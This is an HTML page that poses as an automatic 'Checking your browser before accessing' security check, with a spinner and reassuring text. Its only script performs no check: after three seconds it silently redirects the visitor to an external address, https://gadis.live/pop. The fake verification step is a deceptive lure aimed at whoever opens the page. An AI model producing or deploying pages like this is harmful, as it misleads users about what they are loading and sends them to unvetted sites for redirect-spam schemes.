<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Checking your browser...</title>
  <style>
    body {
      background: #121212;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }
    .loader {
      margin-top: 20px;
      border: 8px solid #2c2c2c;
      border-top: 8px solid #00e5ff;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .message {
      font-size: 1.2rem;
      margin-top: 20px;
      color: #ccc;
    }
  </style>
  <script>
    setTimeout(function() {
      window.location.href = "https://gadis.live/pop";
    }, 3000); // 3 detik
  </script>
</head>
<body>
  <h2>Checking your browser before accessing</h2>
  <div class="loader"></div>
  <div class="message">This process is automatic. Your browser will redirect shortly...</div>
</body>
</html>
